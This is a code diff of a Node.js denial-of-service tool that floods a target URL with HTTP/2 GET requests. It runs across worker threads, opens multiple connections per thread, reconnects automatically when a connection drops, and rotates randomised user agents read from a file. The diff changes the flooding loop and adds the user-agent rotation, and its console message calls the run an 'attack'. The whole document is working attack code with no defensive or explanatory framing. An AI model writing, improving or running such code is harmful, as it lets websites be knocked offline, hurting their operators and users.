@@ -1,8 +1,9 @@
 const http2 = require('http2');
-const { Worker, isMainThread, workerData } = require('worker_threads');
+const fs = require('fs');
+const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
 const { cpus } = require('os');
 
-const THREADS = Math.min(8, cpus().length);
+const THREADS = Math.min(6, cpus().length);
 
 if (isMainThread) {
     if (process.argv.length < 4) {
@@ -11,38 +12,62 @@ if (isMainThread) {
     }
 
     const target = process.argv[2];
-    const duration = parseInt(process.argv[3], 10);
+    const duration = parseInt(process.argv[3]);
 
-    console.log(`Launching ultra attack on ${target} for ${duration}s with ${THREADS} threads...`);
+    // Load user agents
+    let userAgents = [];
+    try {
+        userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(Boolean);
+    } catch (e) {
+        console.error('ua.txt not found or empty.');
+        process.exit(1);
+    }
+
+    console.log(`Launching attack on ${target} for ${duration}s with ${THREADS} threads...`);
 
     for (let i = 0; i < THREADS; i++) {
-        new Worker(__filename, { workerData: { target, duration } });
+        new Worker(__filename, { workerData: { target, duration, userAgents } });
     }
 } else {
-    const { target, duration } = workerData;
+    const { target, duration, userAgents } = workerData;
     const end = Date.now() + duration * 1000;
 
-    function flood(client) {
-        const send = () => {
-            if (Date.now() > end || client.closed || client.destroyed) return;
+    function getRandomUA() {
+        const index = Math.floor(Math.random() * userAgents.length);
+        return userAgents[index];
+    }
 
-            for (let i = 0; i < 500; i++) {
-                const req = client.request({ ':path': '/', ':method': 'GET' });
-                req.on('error', () => {});
-                req.end();
+    function startFlood(client) {
+        const interval = setInterval(() => {
+            if (Date.now() > end) return clearInterval(interval);
+            if (client.destroyed || client.closed) return;
+
+            for (let i = 0; i < 100; i++) {
+                try {
+                    const req = client.request({
+                        ':path': '/',
+                        ':method': 'GET',
+                        'user-agent': getRandomUA()
+                    });
+                    req.on('error', () => {});
+                    req.end();
+                } catch (_) {}
             }
-
-            setImmediate(send); // burn CPU nonstop
-        };
-        send();
+        }, 0);
     }
 
-    function start() {
-        const client = http2.connect(target);
+    function createConnection() {
+        let client;
+        try {
+            client = http2.connect(target);
+        } catch (_) {
+            return setTimeout(createConnection, 100);
+        }
+
         client.on('error', () => {});
-        client.on('connect', () => flood(client));
-        client.on('close', () => setTimeout(start, 100));
+        client.on('close', () => setTimeout(createConnection, 100));
+        client.on('connect', () => startFlood(client));
     }
 
-    start();
+    for (let i = 0; i < 10; i++) createConnection();
 }
